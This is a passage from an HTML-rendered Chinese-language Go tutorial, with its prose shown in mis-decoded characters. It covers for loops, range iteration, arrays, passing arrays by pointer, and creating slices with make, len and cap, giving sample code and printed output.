class="hljs-number">5</span>, <span class="hljs-number">7</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-keyword">for</span> a := <span class="hljs-number">0</span>; a &lt; b; a++ &#123;<br>fmt.Print(numbers[a])<br>&#125;<br>&#125;<br>&gt;&gt; <span class="hljs-number">123579</span><br></code></pre></td></tr></table></figure><p>åŒå¾ªç¯</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">for</span> i := <span class="hljs-number">1</span>; i &lt;= <span class="hljs-number">9</span>; i++ &#123;<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">1</span>; j &lt;= <span class="hljs-number">9</span>; j++ &#123;<br><span class="hljs-keyword">if</span> i &lt;= j &#123;<br>fmt.Printf(<span class="hljs-string">&quot;%d * %d = %2d  &quot;</span>, i, j, i*j)<br>&#125;<br>&#125;<br>fmt.Println()<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="for-range"><a href="#for-range" class="headerlink" title="for range"></a>for range</h2><p><code>for</code> å¾ªç¯çš„ <code>range</code> æ ¼å¼å¯ä»¥å¯¹ sliceã€mapã€æ•°ç»„ã€å­—ç¬¦ä¸²ã€åˆ‡ç‰‡ã€æ˜ å°„è¡¨ï¼Œchannel ç­‰è¿›è¡Œè¿­ä»£å¾ªç¯ï¼Œä¸€èˆ¬æ ¼å¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">for</span> index, value := <span class="hljs-keyword">range</span> iterable &#123;<br>  <span class="hljs-comment">// body</span><br>&#125;<br></code></pre></td></tr></table></figure><h1 id="æ•°ç»„-Array"><a href="#æ•°ç»„-Array" class="headerlink" title="æ•°ç»„ Array"></a>æ•°ç»„ Array</h1><p>go çš„æ•°ç»„å’Œå…¶ä»–è¯­è¨€æ•°ç»„æœ‰ä¸€äº›åŒºåˆ«</p><h2 id="åˆå§‹åŒ–"><a href="#åˆå§‹åŒ–" class="headerlink" title="åˆå§‹åŒ–"></a>åˆå§‹åŒ–</h2><h3 id="ä¸€ç»´æ•°ç»„"><a href="#ä¸€ç»´æ•°ç»„" class="headerlink" title="ä¸€ç»´æ•°ç»„"></a>ä¸€ç»´æ•°ç»„</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">//å…¨å±€</span><br><span class="hljs-keyword">var</span> arr0 [<span class="hljs-number">5</span>]<span class="hljs-type">int</span> = [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br><span class="hljs-keyword">var</span> arr1 = [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><span class="hljs-keyword">var</span> arr2 = [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;<br><span class="hljs-keyword">var</span> str = [<span class="hljs-number">5</span>]<span class="hljs-type">string</span>&#123;<span class="hljs-number">3</span>: <span class="hljs-string">&quot;hhhhh&quot;</span>, <span class="hljs-number">4</span>: <span class="hljs-string">&quot;xxxxxx&quot;</span>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">//å±€éƒ¨</span><br>a := [<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>&#125;<br>b := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>&#125;<br>c := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>: <span class="hljs-number">100</span>, <span class="hljs-number">4</span>: <span class="hljs-number">200</span>&#125;<br>d := [...]<span class="hljs-keyword">struct</span> &#123;<br>name <span class="hljs-type">string</span><br>age  <span class="hljs-type">uint8</span><br>&#125;&#123;<br>&#123;<span class="hljs-string">&quot;a&quot;</span>, <span class="hljs-number">10</span>&#125;,<br>&#123;<span class="hljs-string">&quot;b&quot;</span>, <span class="hljs-number">20</span>&#125;,<br>&#125;<br>fmt.Println(arr0, arr1, arr2, str)<br>fmt.Println(a, b, c, d)<br><br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>] [   hhhhh xxxxxx]<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">0</span>] [<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">100</span> <span class="hljs-number">0</span> <span class="hljs-number">200</span>] [&#123;a <span class="hljs-number">10</span>&#125; &#123;b <span class="hljs-number">20</span>&#125;]<br></code></pre></td></tr></table></figure><h3 id="å¤šç»´æ•°ç»„"><a href="#å¤šç»´æ•°ç»„" class="headerlink" title="å¤šç»´æ•°ç»„"></a>å¤šç»´æ•°ç»„</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr0 [<span class="hljs-number">5</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span><br><span class="hljs-keyword">var</span> arr1 [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span> = [...][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>a := [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;&#125;<br>b := [...][<span class="hljs-number">2</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">1</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">2</span>&#125;, &#123;<span class="hljs-number">3</span>, <span class="hljs-number">3</span>&#125;&#125;<br>fmt.Println(arr0, arr1)<br>fmt.Println(a, b)<br><br>&#125;<br>&gt;&gt;<br>[[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>] [<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]] [[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span>]]<br>[[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>] [<span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>]] [[<span class="hljs-number">1</span> <span class="hljs-number">1</span>] [<span class="hljs-number">2</span> <span class="hljs-number">2</span>] [<span class="hljs-number">3</span> <span class="hljs-number">3</span>]]<br></code></pre></td></tr></table></figure><p>ç¬¬äºŒç»´åº¦ä¸èƒ½ç”¨ <code>...</code> æ¥è¡¨ç¤ºï¼Œæœªèµ‹å€¼çš„æ•°ç»„åˆå§‹åŒ–ä¸º 0</p><h3 id="å¤šç»´æ•°ç»„éå†"><a href="#å¤šç»´æ•°ç»„éå†" class="headerlink" title="å¤šç»´æ•°ç»„éå†"></a>å¤šç»´æ•°ç»„éå†</h3><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> a [<span class="hljs-number">2</span>][<span class="hljs-number">3</span>]<span class="hljs-type">int</span> = [...][<span class="hljs-number">3</span>]<span class="hljs-type">int</span>&#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;&#125;<br><span class="hljs-keyword">for</span> k1, v1 := <span class="hljs-keyword">range</span> a &#123;<br><span class="hljs-keyword">for</span> k2, v2 := <span class="hljs-keyword">range</span> v1 &#123;<br>fmt.Printf(<span class="hljs-string">&quot;(%d,%d)=%d&quot;</span>, k1, k2, v2)<br>&#125;<br>fmt.Println()<br>&#125;<br>&#125;<br>&gt;&gt;<br>(<span class="hljs-number">0</span>,<span class="hljs-number">0</span>)=<span class="hljs-number">1</span> (<span class="hljs-number">0</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">2</span> (<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">3</span> <br>(<span class="hljs-number">1</span>,<span class="hljs-number">0</span>)=<span class="hljs-number">4</span> (<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=<span class="hljs-number">5</span> (<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)=<span class="hljs-number">6</span> <br></code></pre></td></tr></table></figure><h2 id="æ•°ç»„æ‹·è´å’Œä¼ å‚"><a href="#æ•°ç»„æ‹·è´å’Œä¼ å‚" class="headerlink" title="æ•°ç»„æ‹·è´å’Œä¼ å‚"></a>æ•°ç»„æ‹·è´å’Œä¼ å‚</h2><p>å€¼æ‹·è´ä¼šé€ æˆæ€§èƒ½é—®é¢˜ï¼Œé€šå¸¸ä½¿ç”¨ slice æˆ–æ•°ç»„æŒ‡é’ˆ</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">printArr</span><span class="hljs-params">(arr *[5]<span class="hljs-type">int</span>)</span></span> &#123;<br>arr[<span class="hljs-number">0</span>] = <span class="hljs-number">10</span><br><span class="hljs-keyword">for</span> k, v := <span class="hljs-keyword">range</span> arr &#123;<br>fmt.Println(k, v)<br>&#125;<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">var</span> arr1 [<span class="hljs-number">5</span>]<span class="hljs-type">int</span><br>printArr(&amp;arr1)<br>fmt.Println(arr1)<br>arr2 := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">2</span>, <span class="hljs-number">4</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>, <span class="hljs-number">10</span>&#125;<br>printArr(&amp;arr2)<br>fmt.Println(arr2)<br>&#125;<br>&gt;&gt;<br><span class="hljs-number">0</span> <span class="hljs-number">10</span><br><span class="hljs-number">1</span> <span class="hljs-number">0</span><br><span class="hljs-number">2</span> <span class="hljs-number">0</span><br><span class="hljs-number">3</span> <span class="hljs-number">0</span><br><span class="hljs-number">4</span> <span class="hljs-number">0</span><br>[<span class="hljs-number">10</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br><span class="hljs-number">0</span> <span class="hljs-number">10</span><br><span class="hljs-number">1</span> <span class="hljs-number">4</span><br><span class="hljs-number">2</span> <span class="hljs-number">6</span><br><span class="hljs-number">3</span> <span class="hljs-number">8</span><br><span class="hljs-number">4</span> <span class="hljs-number">10</span><br>[<span class="hljs-number">10</span> <span class="hljs-number">4</span> <span class="hljs-number">6</span> <span class="hljs-number">8</span> <span class="hljs-number">10</span>]<br></code></pre></td></tr></table></figure><p>ä¸ºä»€ä¹ˆ arr2 æ•°ç»„è¾“å‡ºçš„ç¬¬ä¸€ä¸ªå€¼ä¸æ˜¯ 2 å‘¢ï¼Œå› ä¸ºåœ¨è¿›å…¥ <code>printArr</code> å‡½æ•°æ—¶ï¼Œ<code>arr[0]=10</code>ï¼Œæ‰€ä»¥ä¼šè¢«èµ‹å€¼ä¸º 10ï¼Œè¾“å‡ºçš„å°±æ˜¯ 10</p><h1 id="åˆ‡ç‰‡-Slice"><a href="#åˆ‡ç‰‡-Slice" class="headerlink" title="åˆ‡ç‰‡ Slice"></a>åˆ‡ç‰‡ Slice</h1><p>Slice æ—¢ä¸æ˜¯æ•°ç»„ä¹Ÿä¸æ˜¯æ•°ç»„æŒ‡é’ˆï¼Œæ˜¯æ•°ç»„çš„ä¸€ä¸ªå¼•ç”¨ï¼Œæ˜¯å¼•ç”¨ç±»å‹ã€‚è‡ªèº«æ˜¯ç»“æ„ä½“ï¼Œå€¼æ‹·è´ä¼ é€’ã€‚é•¿åº¦å¯å˜ï¼Œä¸€èˆ¬æ ¼å¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> å˜é‡å []ç±»å‹<br><span class="hljs-keyword">var</span> str []<span class="hljs-type">string</span><br></code></pre></td></tr></table></figure><h2 id="åˆ›å»ºåˆ‡ç‰‡"><a href="#åˆ›å»ºåˆ‡ç‰‡" class="headerlink" title="åˆ›å»ºåˆ‡ç‰‡"></a>åˆ›å»ºåˆ‡ç‰‡</h2><p>åœ¨ fun main ä¸­</p><p>å£°æ˜åˆ‡ç‰‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s1 []<span class="hljs-type">int</span><br><span class="hljs-keyword">if</span> s1 == <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;null&quot;</span>)<br><br>&#125; <span class="hljs-keyword">else</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;ä¸æ˜¯ null&quot;</span>)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>:&#x3D; åˆ›å»º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go">s2 := []<span class="hljs-type">int</span>&#123;&#125;<br>fmt.Println(s2)<br></code></pre></td></tr></table></figure><p>make() åˆ›å»º</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s3 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>)<br>fmt.Println(s3)<br></code></pre></td></tr></table></figure><p>åˆå§‹åŒ–èµ‹å€¼</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> s4 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>)<br>fmt.Println(s4)<br></code></pre></td></tr></table></figure><p>ä»æ•°ç»„åˆ‡ç‰‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">s5 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;<br>fmt.Println(s5)<br>arr := [<span class="hljs-number">5</span>]<span class="hljs-type">int</span>&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>&#125;<br><span class="hljs-keyword">var</span> s6 []<span class="hljs-type">int</span><br>s6 = arr[<span class="hljs-number">1</span>:<span class="hljs-number">4</span>]<br>fmt.Println(s6)<br>&gt;&gt;<br>[<span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span>]<br>[<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span>]<br></code></pre></td></tr></table></figure><h2 id="åˆ‡ç‰‡åˆå§‹åŒ–"><a href="#åˆ‡ç‰‡åˆå§‹åŒ–" class="headerlink" title="åˆ‡ç‰‡åˆå§‹åŒ–"></a>åˆ‡ç‰‡åˆå§‹åŒ–</h2><p>len() é•¿åº¦ï¼Œcap() å®¹é‡</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> arr = [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>, <span class="hljs-number">7</span>, <span class="hljs-number">8</span>, <span class="hljs-number">9</span>&#125;<br><span class="hljs-keyword">var</span> slice0 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>]<br><span class="hljs-keyword">var</span> slice1 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br><span class="hljs-keyword">var</span> slice2 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">5</span>:<span class="hljs-number">10</span>]<br><span class="hljs-keyword">var</span> slice3 []<span class="hljs-type">int</span> = arr[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(arr)]<br><span class="hljs-keyword">var</span> slice4 = arr[:<span class="hljs-built_in">len</span>(arr)<span class="hljs-number">-1</span>]<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>fmt.Println(arr, slice0, slice1, slice2, slice3, slice4)<br>arr2 := [...]<span class="hljs-type">int</span>&#123;<span class="hljs-number">9</span>, <span class="hljs-number">8</span>, <span class="hljs-number">7</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>, <span class="hljs-number">4</span>, <span class="hljs-number">3</span>, <span class="hljs-number">2</span>, <span class="hljs-number">1</span>, <span class="hljs-number">0</span>&#125;<br>slice5 := arr[<span class="hljs-number">2</span>:<span class="hljs-number">8</span>]<br>slice6 := arr[<span class="hljs-number">0</span>:<span class="hljs-number">6</span>]<br>slice7 := arr[<span class="hljs-number">5</span>:<span class="hljs-number">10</span>]<br>slice8 := arr[<span class="hljs-number">0</span>:<span class="hljs-built_in">len</span>(arr)]<br>slice9 := arr[:<span class="hljs-built_in">len</span>(arr)<span class="hljs-number">-1</span>]<br>fmt.Println(arr2, slice5, slice6, slice7, slice8, slice9)<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span>]<br>[<span class="hljs-number">9</span> <span class="hljs-number">8</span> <span class="hljs-number">7</span> <span class="hljs-number">6</span> <span class="hljs-number">5</span> <span class="hljs-number">4</span> <span class="hljs-number">3</span> <span class="hljs-number">2</span> <span class="hljs-number">1</span> <span class="hljs-number">0</span>] [<span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span>] [<span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span> <span class="hljs-number">9</span>] [<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">4</span> <span class="hljs-number">5</span> <span class="hljs-number">6</span> <span class="hljs-number">7</span> <span class="hljs-number">8</span>]<br></code></pre></td></tr></table></figure><h2 id="make-åˆ›å»ºåˆ‡ç‰‡"><a href="#make-åˆ›å»ºåˆ‡ç‰‡" class="headerlink" title="make() åˆ›å»ºåˆ‡ç‰‡"></a>make() åˆ›å»ºåˆ‡ç‰‡</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> slice []<span class="hljs-keyword">type</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>)<br>slice  := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>)<br>slice  := <span class="hljs-built_in">make</span>([]<span class="hljs-keyword">type</span>, <span class="hljs-built_in">len</span>, <span class="hljs-built_in">cap</span>)(ç±»å‹ï¼Œé•¿åº¦ï¼Œå®¹é‡)<br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">var</span> slice1 []<span class="hljs-type">int</span> = <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>slice2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>)<br>slice3 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">10</span>, <span class="hljs-number">10</span>)<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br>[<span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span>]<br></code></pre></td></tr></table></figure><p>åˆ›å»º slice æ•°ç»„ï¼Œè‡ªåŠ¨åˆ†é…åº•å±‚æ•°ç»„</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>s1 := []<span class="hljs-type">int</span>&#123;<span class="hljs-number">0</span>, <span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">8</span>: <span class="hljs-number">100</span>&#125;<span class="hljs-comment">//ä½¿ç”¨ç´¢å¼•åˆå§‹åŒ–</span><br>fmt.Println(s1, <span class="hljs-built_in">len</span>(s1), <span class="hljs-built_in">cap</span>(s1))<br><br>s2 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">6</span>, <span class="hljs-number">8</span>)<br>fmt.Println(s2, <span class="hljs-built_in">len</span>(s2), <span class="hljs-built_in">cap</span>(s2))<br><br>s3 := <span class="hljs-built_in">make</span>([]<span class="hljs-type">int</span>, <span class="hljs-number">6</span>)<br>fmt.Println(s3, <span class="hljs-built_in">len</span>(s3), <span class="hljs-built_in">cap</span>(s3))<br>&#125;<br>&gt;&gt;<br>[<span class="hljs-number">0</span> <span class="hljs-number">1</span> <span class="hljs-number">2</span> <span class="hljs-number">3</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">100</span>] <span class="hljs-number">9</span> <span class="hljs-number">9</span><br>[<span 